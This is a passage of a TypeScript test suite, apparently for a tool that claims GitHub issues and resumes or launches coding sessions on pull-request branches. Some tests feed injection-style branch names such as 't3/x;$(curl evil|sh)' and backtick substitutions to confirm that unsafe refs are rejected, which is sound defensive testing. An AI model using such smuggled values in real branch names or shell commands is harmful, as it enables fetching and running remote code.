      });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assertResumedOntoPr(dataDir, t3);
    }),
  );

  it.effect(
    "with an empty ledger, continues the open pull request GitHub says closes the issue",
    () =>
      Effect.gen(function* () {
        // Another machine opened it: only GitHub knows. The launch line names this run itself.
        const dataDir = tempDir();
        const { tracker, calls } = fakeTracker({ closing: [closingDraft("t3code/abc")] });
        const t3 = fakeSessions(dataDir, {});
        yield* startIn(dataDir, tracker, t3.sessions);
        const request = t3.launchRequests[0]!;
        assert.strictEqual(request.commandId, "softfac:rawphp__softfac__7__1:launch");
        assert.strictEqual(request.pullRequestUrl, URL12);
        assert.strictEqual(request.baseRef, "t3code/abc");
        assert.strictEqual(
          request.message,
          launchMessage(REPO, 7, USER, {
            after: "existing-pr",
            branch: "t3code/abc",
            prUrl: URL12,
          }),
        );
        assert.deepStrictEqual(prLookups(calls), ["openPullRequestsClosing 7"]);
        const line = entriesOf(dataDir, run7).find((e) => e.event === "session_launched")!;
        assert.deepStrictEqual((line.data as { resumed_from: unknown }).resumed_from, {
          run: "rawphp__softfac__7__1",
          branch: "t3code/abc",
        });
      }),
  );

  it.effect("continues the ledger's pull request of an attempt before the last one", () =>
    Effect.gen(function* () {
      // Attempt 1 opened #12; attempt 2 said stuck without one. Attempt 3 continues #12.
      const dataDir = tempDir();
      seedEndedWithPr(dataDir, { outcome: "needs-info" });
      seedEndedWithPr(
        dataDir,
        { outcome: "stuck", code: "session-stuck" },
        { attempt: 2, pr: false },
      );
      const { tracker, calls } = fakeTracker({ pulls: { 12: openDraft("t3code/abc") } });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      const request = t3.launchRequests[0]!;
      assert.strictEqual(request.commandId, "softfac:rawphp__softfac__7__3:launch");
      assert.strictEqual(request.baseRef, "t3code/abc");
      assert.ok(request.message.includes(URL12), request.message);
      assert.deepStrictEqual(prLookups(calls), ["pullRequest 12"]);
      const line = entriesOf(dataDir, run7n(3)).find((e) => e.event === "session_launched")!;
      assert.deepStrictEqual((line.data as { resumed_from: unknown }).resumed_from, {
        run: "rawphp__softfac__7__3",
        branch: "t3code/abc",
      });
    }),
  );

  it.effect("continues the newest attempt's pull request when two attempts recorded one each", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedEndedWithPr(dataDir, { outcome: "needs-info" });
      // Attempt 2 recorded #13 on t3code/second.
      const ledger = Ledger.create(dataDir, run7n(2), { clock: () => T0 - 900 });
      try {
        for (const { line, cause: why } of startedLinesOn("t3code/second")) {
          ledger.append(line, why);
        }
        ledger.append(
          {
            event: "pr_opened",
            data: { pr: 13, url: "https://github.com/rawphp/softfac/pull/13" },
          },
          makeCause("advance", "pr-opened"),
        );
        ledger.finish("stuck", null, null, makeCause("advance", "session-stuck"));
      } finally {
        ledger.close();
      }
      const { tracker, calls } = fakeTracker({
        pulls: {
          12: openDraft("t3code/abc"),
          13: { ...openDraft("t3code/second"), number: 13 },
        },
      });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.strictEqual(t3.launchRequests[0]!.baseRef, "t3code/second");
      assert.deepStrictEqual(prLookups(calls), ["pullRequest 13"]);
    }),
  );

  it.effect(
    "passes over the ledger's pull request when it is not on this base, from a fork, or on a branch a command cannot be handed",
    () =>
      Effect.gen(function* () {
        for (const over of [
          { baseRef: "dev" },
          { crossRepository: true },
          { headRef: "--force" },
          { headRef: "a b" },
          { headRef: "t3/x;$(curl evil|sh)" },
          { headRef: "t3/x`y`" },
        ] satisfies ReadonlyArray<Partial<PullRequest>>) {
          const dataDir = tempDir();
          seedEndedWithPr(dataDir, { outcome: "needs-info" });
          const { tracker, calls } = fakeTracker({
            pulls: { 12: { ...openDraft("t3code/abc"), ...over } },
          });
          const t3 = fakeSessions(dataDir, {});
          yield* startIn(dataDir, tracker, t3.sessions);
          assert.deepStrictEqual(
            prLookups(calls),
            ["pullRequest 12", "openPullRequestsClosing 7"],
            JSON.stringify(over),
          );
          assertPlainStart(dataDir, t3);
        }
      }),
  );

  it.effect("matches the factory's login on GitHub whatever its case", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({
        closing: [closingDraft("t3code/abc", { author: USER.toUpperCase() })],
      });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.strictEqual(t3.launchRequests[0]!.baseRef, "t3code/abc");
    }),
  );

  it.effect("takes the newest open pull request of the factory's own on GitHub", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      // Listed oldest last: the number decides, not the order.
      const { tracker } = fakeTracker({
        closing: [
          closingDraft("t3code/abc"),
          closingDraft("t3code/first", {
            number: 11,
            url: "https://github.com/rawphp/softfac/pull/11",
          }),
        ],
      });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.strictEqual(t3.launchRequests[0]!.baseRef, "t3code/abc");
      assert.ok(t3.launchRequests[0]!.message.includes(URL12));
    }),
  );

  it.effect("passes over pull requests that are not the factory's own on this base", () =>
    Effect.gen(function* () {
      for (const other of [
        closingDraft("t3code/abc", { author: "someone" }),
        closingDraft("t3code/abc", { author: null }),
        closingDraft("t3code/abc", { crossRepository: true }),
        closingDraft("t3code/abc", { baseRef: "dev" }),
        closingDraft("--force"),
        closingDraft("a b"),
        closingDraft("t3/x;$(curl evil|sh)"),
        closingDraft("t3/x`y`"),
      ]) {
        const dataDir = tempDir();
        const { tracker } = fakeTracker({ closing: [other] });
        const t3 = fakeSessions(dataDir, {});
        yield* startIn(dataDir, tracker, t3.sessions);
        const request = t3.launchRequests[0]!;
        assert.strictEqual(request.baseRef, "main", JSON.stringify(other));
        assert.strictEqual(request.message, launchMessage(REPO, 7, USER));
      }
    }),
  );

  it.effect("falls back to a plain start when the ledger's pull request is no longer open", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedEndedWithPr(dataDir, { outcome: "needs-info" });
      const { tracker, calls } = fakeTracker({
        pulls: { 12: { ...openDraft("t3code/abc"), open: false } },
      });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(prLookups(calls), ["pullRequest 12", "openPullRequestsClosing 7"]);
      assertPlainStart(dataDir, t3);
    }),
  );

  it.effect("falls back to the branch after a time limit when the pull request is closed", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedEndedWithPr(dataDir, { outcome: "stuck", code: "time-limit" });
      const { tracker } = fakeTracker({ pulls: { 12: null } });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      const request = t3.launchRequests[0]!;
      assert.strictEqual(request.baseRef, "t3code/abc");
      assert.ok(request.message.includes(RESUME_WORDS), request.message);
    }),
  );

  it.effect(
    "is an error that leaves the issue in triage when GitHub cannot list the pull requests",
    () =>
      Effect.gen(function* () {
        const dataDir = tempDir();
        const { tracker, calls } = fakeTracker({ closing: ghFailure() });
        const t3 = fakeSessions(dataDir, {});
        const error = yield* Effect.flip(startIn(dataDir, tracker, t3.sessions));
        assert.strictEqual(error._tag, "GitHubFailed");
        assert.deepStrictEqual(t3.launchRequests, []);
        assert.ok(!calls.some((c) => c.startsWith("setState 7 building")), calls.join("\n"));
      }),
  );

  it.effect("sent again, reuses the recorded pull request and asks GitHub nothing", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedEndedWithPr(dataDir, { outcome: "needs-info" });
      seedSecondRun(dataDir, [
        ...startedLines().slice(0, 3),
        {
          line: {
            event: "step_changed",
            data: { step: `launch-pull-request t3code/abc ${URL12}` },
          },
          cause: cause("launch-sending"),
        },
        {
          line: { event: "step_changed", data: { step: "launch-sending resumed-from t3code/abc" } },
          cause: cause("launch-sending"),
        },
      ]);
      // The pull request was closed since the first send: the retry sends the same request.
      const { tracker, calls } = fakeTracker({
        issues: [detail("triage", [USER])],
        pulls: { 12: null },
      });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assertResumedOntoPr(dataDir, t3);
      assert.deepStrictEqual(prLookups(calls), []);
      assert.deepStrictEqual(lookups(calls), []);
    }),
  );
});

describe("start: an issue that names its base", () => {
  const withBody = (body: string) => ({ ...detail("ready"), body });
  const baseOf = (dataDir: string) =>
    (entriesOf(dataDir).find((e) => e.event === "session_launched")?.data as { base?: unknown })
      ?.base;

  it.effect("launches from the named branch on origin and records it", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [withBody("Build it.\n\n## Base\n\nfeature/x\n\n## Notes\nx\n")],
      });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.strictEqual(outcome.kind, "started");
      assert.ok(calls.includes("branchTip feature/x"), calls.join("\n"));
      const request = t3.launchRequests[0]!;
      assert.strictEqual(request.baseRef, "feature/x");
      assert.strictEqual(
        request.message,
        launchMessage(REPO, 7, USER, undefined, "feature/x"),
      );
      assert.ok(
        request.message.includes(
          "Open the pull request against feature/x, not the repo's default base.",
        ),
        request.message,
      );
      assert.strictEqual(baseOf(dataDir), "feature/x");
    }),
  );

  it.effect("an issue with no base records the project's base and says nothing more", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({ issues: [withBody("## Base\n\nNone.\n")] });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(lookups(calls), []);
      assert.strictEqual(t3.launchRequests[0]!.message, launchMessage(REPO, 7, USER));
      assert.strictEqual(baseOf(dataDir), "main");
    }),
  );

  it.effect("a base that is not a branch name goes stuck before any launch is sent", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({ issues: [withBody("## Base\n--force x\n")] });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      const reason = "base branch --force x is not a branch name";
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason });
      assert.deepStrictEqual(calls.slice(3), stuckCalls(reason, null));
      assert.deepStrictEqual(t3.launchRequests, []);
      assert.deepStrictEqual(entriesOf(dataDir), [
        ...startedEvents().slice(0, 3),
        ...stuckTail(reason, "launch-failed"),
      ]);
    }),
  );

  it.effect("a base that origin does not have goes stuck before any launch is sent", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [withBody("## Base\nfeature/gone\n")],
        branchTip: "missing",
      });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      const reason = "base branch feature/gone is not on origin";
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason });
      assert.deepStrictEqual(calls.slice(3), [
        "branchTip feature/gone",
        ...stuckCalls(reason, null),
      ]);
      assert.deepStrictEqual(t3.launchRequests, []);
    }),
  );

  it.effect("a base with an empty or dot segment is not a branch name", () =>
    Effect.gen(function* () {
      for (const name of ["feature/", "/x", "a//b", "a/./b"]) {
        const dataDir = tempDir();
        const { tracker, calls } = fakeTracker({ issues: [withBody(`## Base\n${name}\n`)] });
        const t3 = fakeSessions(dataDir, {});
        const outcome = yield* startIn(dataDir, tracker, t3.sessions);
        const reason = `base branch ${name} is not a branch name`;
        assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason });
        assert.deepStrictEqual(lookups(calls), []);
      }
    }),
  );

  it.effect("a base the tracker refuses as a name is not a branch name, not an error", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [withBody("## Base\nfeature/odd\n")],
        branchTip: new GitHubInvalidArgument({ argument: "feature/odd", expected: "a branch" }),
      });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      const reason = "base branch feature/odd is not a branch name";
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason });
      assert.deepStrictEqual(calls.slice(3), [
        "branchTip feature/odd",
        ...stuckCalls(reason, null),
      ]);
      assert.deepStrictEqual(t3.launchRequests, []);
    }),
  );

  it.effect(
    "a launch sent again keeps the base the first send decided and asks GitHub nothing",
    () =>
      Effect.gen(function* () {
        const dataDir = tempDir();
        seedRun(dataDir, [
          ...startedLines().slice(0, 3),
          {
            line: { event: "step_changed", data: { step: "launch-base feature/x" } },
            cause: cause("launch-sending"),
          },
          startedLines()[3]!,
        ]);
        // An instructor took the heading out after the first send.
        const { tracker, calls } = fakeTracker({
          issues: [{ ...detail("triage", [USER]), body: "Build it." }],
        });
        const t3 = fakeSessions(dataDir, {});
        assert.strictEqual((yield* startIn(dataDir, tracker, t3.sessions)).kind, "started");
        assert.deepStrictEqual(lookups(calls), []);
        const request = t3.launchRequests[0]!;
        assert.strictEqual(request.baseRef, "feature/x");
        assert.strictEqual(baseOf(dataDir), "feature/x");
      }),
  );

  it.effect("the first send records the base it decided before the launch", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({ issues: [withBody("## Base\nfeature/x\n")] });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      const steps = entriesOf(dataDir)
        .filter((e) => e.event === "step_changed")
        .map((e) => (e.data as { step: string }).step);
      assert.deepStrictEqual(steps.slice(1, 3), ["launch-base feature/x", "launch-sending"]);
    }),
  );

  it.effect("a base whose lookup fails claims and waits for the next pass", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({
        issues: [withBody("## Base\nfeature/x\n")],
        branchTip: ghFailure(),
      });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* Effect.result(startIn(dataDir, tracker, t3.sessions));
      assert.strictEqual(outcome._tag, "Failure");
      assert.deepStrictEqual(t3.launchRequests, []);
      assert.ok(!stepsOf(dataDir).includes("stuck"));
    }),
  );
});

describe("start: claim comments of several machines", () => {
  /** Another machine's claim comment, made `offsetMs` after T0. */
  const elsewhere = (offsetMs: number, machine = "trilogy-mac"): ClaimComment => ({
    id: 40,
    machine,
    createdAt: utcSecond(T0 + offsetMs),
  });

  it.effect("a fresh claim names this machine and the label that began it", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, claimers } = fakeTracker({});
      yield* startIn(dataDir, tracker);
      assert.deepStrictEqual(claimers, [
        { machine: "mac-mini", since: LABELED, trusted: [USER, "tomkaczocha"] },
      ]);
    }),
  );

  it.effect("a claim another machine won makes no run, no launch and no status comment", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        claims: [{ kind: "claimed-elsewhere", machine: "trilogy-mac" }],
      });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, {
        kind: "skipped",
        reason: "claimed by machine trilogy-mac",
        claimedBy: "trilogy-mac",
      });
      assert.deepStrictEqual(calls, [
        "issue 7",
        "approval 7 tomkaczocha",
        "claim 7 rawphp ready->triage",
      ]);
      assert.deepStrictEqual(t3.calls, ["findProject /work/softfac"]);
      assert.strictEqual(NodeFS.existsSync(NodePath.join(dataDir, "runs")), false);
    }),
  );

  it.effect("a triage issue of the shared login is not resumed when another machine won it", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("triage", [USER])],
        winner: elsewhere(60_000),
      });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* resume(ctxFor(dataDir, tracker, t3.sessions), 7);
      assert.deepStrictEqual(outcome, {
        kind: "skipped",
        reason: "claimed by machine trilogy-mac",
        claimedBy: "trilogy-mac",
      });
      assert.deepStrictEqual(calls, ["issue 7", "claimWinner 7 rawphp,tomkaczocha"]);
      assert.deepStrictEqual(t3.calls, []);
      assert.strictEqual(NodeFS.existsSync(NodePath.join(dataDir, "runs")), false);
    }),
  );

  it.effect("a triage issue whose winning claim names this machine is resumed", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, startedLines().slice(0, 3));
      const { tracker } = fakeTracker({
        issues: [detail("triage", [USER])],
        winner: elsewhere(-60_000, "Mac-Mini"),
      });
      const outcome = yield* resume(
        ctxFor(dataDir, tracker, fakeSessions(dataDir, {}).sessions),
        7,
      );
      assert.deepStrictEqual(outcome, { kind: "started", run: run7, threadId: "thread-1" });
    }),
  );

  it.effect(
    "a triage run of this machine's that another machine's later claim beat is finished",
    () =>
      Effect.gen(function* () {
        const dataDir = tempDir();
        olderRun(dataDir, 1, "triage", false, true);
        const { tracker } = fakeTracker({
          issues: [detail("triage", [USER])],
          winner: elsewhere(60_000),
        });
        const outcome = yield* resume(
          ctxFor(dataDir, tracker, fakeSessions(dataDir, {}).sessions),
          7,
        );
        assert.strictEqual(outcome.kind, "skipped");
        const last = readRun(dataDir, run7).entries.at(-1)!;
        assert.strictEqual(last.event, "finished");
        assert.deepStrictEqual(last.cause, makeCause("start", "claimed-elsewhere"));
      }),
  );

  it.effect("a failed claim that finds another machine's claim landed takes nothing", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready"), detail("triage", [USER])],
        claims: [ghFailure()],
        winner: elsewhere(-60_000),
      });
      const outcome = yield* startIn(dataDir, tracker);
      assert.deepStrictEqual(outcome, {
        kind: "skipped",
        reason: "claimed by machine trilogy-mac",
        claimedBy: "trilogy-mac",
      });
      assert.deepStrictEqual(calls.slice(-3), [
        "claim 7 rawphp ready->triage",
        "issue 7",
        "claimWinner 7 rawphp,tomkaczocha",
      ]);
      assert.strictEqual(NodeFS.existsSync(NodePath.join(dataDir, "runs")), false);
    }),
  );

  it.effect(
    "yieldToClaim finishes the runs claimed before another machine's winning claim, writing nothing to GitHub",
    () =>
      Effect.gen(function* () {
        const dataDir = tempDir();
        const older = olderRun(dataDir, 1, "pr-open");
        const { tracker, calls } = fakeTracker({ winner: elsewhere(60_000) });
        const yielded = yield* yieldToClaim(
          ctxFor(dataDir, tracker, fakeSessions(dataDir, {}).sessions),
          7,
        );
        assert.deepStrictEqual(yielded, { machine: "trilogy-mac", finished: [older] });
        assert.deepStrictEqual(calls, ["claimWinner 7 rawphp,tomkaczocha"]);
        const finished = readRun(dataDir, older).entries.at(-1)!;
        assert.strictEqual(finished.event, "finished");
        assert.strictEqual((finished.data as { outcome: string }).outcome, "pr-open");
        assert.deepStrictEqual(finished.cause, makeCause("pass", "claimed-elsewhere"));
      }),
  );

  it.effect("yieldToClaim leaves a run claimed after the winning comment, and its own win", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      olderRun(dataDir, 1, "building");
      const before = fakeTracker({ winner: elsewhere(-60_000) });
      const ctx = ctxFor(dataDir, before.tracker, fakeSessions(dataDir, {}).sessions);
      assert.deepStrictEqual(yield* yieldToClaim(ctx, 7), {
        machine: "trilogy-mac",
        finished: [],
      });
      const own = fakeTracker({ winner: elsewhere(60_000, "mac-mini") });
      assert.strictEqual(
        yield* yieldToClaim(ctxFor(dataDir, own.tracker, fakeSessions(dataDir, {}).sessions), 7),
        null,
      );
      assert.notStrictEqual(readRun(dataDir, run7).entries.at(-1)!.event, "finished");
    }),
  );

  it.effect("yieldToClaim finishes a run with no claim time as claimed before the winner", () =>
    Effect.gen(function* () {
      // Approved, then cut short before the claim: no `claimed` line.
      const before = tempDir();
      seedRun(before, startedLines().slice(0, 1));
      const { tracker } = fakeTracker({ winner: elsewhere(60_000) });
      const ctx = ctxFor(before, tracker, fakeSessions(before, {}).sessions);
      assert.deepStrictEqual(yield* yieldToClaim(ctx, 7), {
        machine: "trilogy-mac",
        finished: [run7],
      });
      assert.deepStrictEqual(
        readRun(before, run7).entries.at(-1)!.cause,
        makeCause("pass", "claimed-elsewhere"),
      );
    }),
  );

  it.effect("a triage issue whose claim comments cannot be read is not resumed", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("triage", [USER])],
        winner: ghFailure(),
      });
      const t3 = fakeSessions(dataDir, {});
      const error = yield* Effect.flip(resume(ctxFor(dataDir, tracker, t3.sessions), 7));
      assert.strictEqual(error._tag, "GitHubFailed");
      assert.deepStrictEqual(calls, ["issue 7", "claimWinner 7 rawphp,tomkaczocha"]);
      assert.deepStrictEqual(t3.calls, []);
      assert.strictEqual(NodeFS.existsSync(NodePath.join(dataDir, "runs")), false);
    }),
  );

  it.effect("a failed claim whose claim comments cannot be read fails with the claim's error", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready"), detail("triage", [USER])],
        claims: [ghFailure()],
        winner: new GitHubFailed({ args: ["api", "comments"], status: 1, stderr: "listing" }),
      });
      const error = yield* Effect.flip(startIn(dataDir, tracker));
      assert.strictEqual(error._tag, "GitHubFailed");
      assert.strictEqual(error._tag === "GitHubFailed" && error.stderr, "boom");
      assert.deepStrictEqual(calls.slice(-2), ["issue 7", "claimWinner 7 rawphp,tomkaczocha"]);
      assert.strictEqual(NodeFS.existsSync(NodePath.join(dataDir, "runs")), false);
    }),
  );

  it.effect(
    "a repo pinned with factory.owner resumes its triage issue without reading claims",
    () =>
      Effect.gen(function* () {
        const dataDir = tempDir();
        seedRun(dataDir, startedLines().slice(0, 3));
        const { tracker, calls } = fakeTracker({
          issues: [detail("triage", [USER])],
          winner: elsewhere(60_000),
        });
        const ctx = ctxFor(dataDir, tracker, fakeSessions(dataDir, {}).sessions, {
          project: { ...project(), owner: "mac-mini" },
        });
        assert.deepStrictEqual(yield* resume(ctx, 7), {
          kind: "started",
          run: run7,
          threadId: "thread-1",
        });
        assert.notInclude(calls, "claimWinner 7 rawphp,tomkaczocha");
      }),
  );

  it.effect("a claim that gave way makes no run and says so", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({ claims: [{ kind: "gave-way" }] });
      const t3 = fakeSessions(dataDir, {});
      assert.deepStrictEqual(yield* startIn(dataDir, tracker, t3.sessions), {
        kind: "skipped",
        reason: CLAIM_GAVE_WAY,
        gaveWay: true,
      });
      assert.deepStrictEqual(t3.calls, ["findProject /work/softfac"]);
      assert.strictEqual(NodeFS.existsSync(NodePath.join(dataDir, "runs")), false);
    }),
  );
});
